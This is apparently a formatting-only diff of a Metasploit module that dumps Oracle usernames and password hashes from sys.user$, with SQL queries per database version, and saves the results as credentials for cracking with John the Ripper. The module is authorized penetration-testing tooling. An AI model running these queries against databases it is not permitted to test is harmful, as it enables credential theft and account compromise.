@@ -10,15 +10,15 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Oracle Password Hashdump',
-      'Description'    => %Q{
+      'Name' => 'Oracle Password Hashdump',
+      'Description' => %Q{
           This module dumps the usernames and password hashes
           from Oracle given the proper Credentials and SID.
           These are then stored as creds for later cracking using auxiliary/analyze/jtr_oracle_fast.
           This module supports Oracle DB versions 8i, 9i, 10g, 11g, and 12c.
       },
-      'Author'         => ['theLightCosine'],
-      'License'        => MSF_LICENSE
+      'Author' => ['theLightCosine'],
+      'License' => MSF_LICENSE
     )
   end
 
@@ -28,7 +28,7 @@ class MetasploitModule < Msf::Auxiliary
     # Checks for Version of Oracle. Behavior varies with oracle version.
     # 12c uses SHA-512 (explained in more detail in report_hashes() below)
     # 11g uses SHA-1 while 8i-10g use DES
-    query =  'select * from v$version'
+    query = 'select * from v$version'
     ver = prepare_exec(query)
 
     if ver.nil?
@@ -39,15 +39,15 @@ class MetasploitModule < Msf::Auxiliary
     unless ver.empty?
       case
       when ver[0].include?('8i')
-        ver='8i'
+        ver = '8i'
       when ver[0].include?('9i')
-        ver='9i'
+        ver = '9i'
       when ver[0].include?('10g')
-        ver='10g'
+        ver = '10g'
       when ver[0].include?('11g')
-        ver='11g'
+        ver = '11g'
       when ver[0].include?('12c')
-        ver='12c'
+        ver = '12c'
       when ver[0].include?('18c')
         print_error("Version 18c is not currently supported")
         return
@@ -59,37 +59,38 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     this_service = report_service(
-          :host  => datastore['RHOST'],
-          :port => datastore['RPORT'],
-          :name => 'oracle',
-          :proto => 'tcp'
-          )
+      :host => datastore['RHOST'],
+      :port => datastore['RPORT'],
+      :name => 'oracle',
+      :proto => 'tcp'
+    )
 
     tbl = Rex::Text::Table.new(
-      'Header'  => 'Oracle Server Hashes',
-      'Indent'   => 1,
+      'Header' => 'Oracle Server Hashes',
+      'Indent' => 1,
       'Columns' => ['Username', 'Hash']
     )
 
     begin
       case ver
-      when '8i', '9i', '10g'    # Get the usernames and hashes for 8i-10g
-        query='SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
-        results= prepare_exec(query)
+      when '8i', '9i', '10g' # Get the usernames and hashes for 8i-10g
+        query = 'SELECT name, password FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
+        results = prepare_exec(query)
         unless results.empty?
           results.each do |result|
-            row= result.split(/,/)
+            row = result.split(/,/)
             tbl << row
           end
         end
-      when '11g', '12c'    # Get the usernames and hashes for 11g or 12c
-        query='SELECT name, spare4 FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
-        results= prepare_exec(query)
-        #print_status("Results: #{results.inspect}")
+      when '11g', '12c' # Get the usernames and hashes for 11g or 12c
+        query = 'SELECT name, spare4 FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
+        results = prepare_exec(query)
+        # print_status("Results: #{results.inspect}")
         unless results.empty?
           results.each do |result|
-            row= result.split(/,/)
+            row = result.split(/,/)
             next unless row.length == 2
+
             tbl << row
           end
         end
@@ -105,7 +106,6 @@ class MetasploitModule < Msf::Auxiliary
   # Save each row in the hash table as credentials (shown by "creds" command)
   # This is done slightly differently, depending on the version
   def report_hashes(table, ver, ip, service)
-
     # Before module jtr_oracle_fast cracks these hashes, they are converted (based on jtr_format)
     # to a format that John The Ripper can handle. This format is stored here.
     case ver
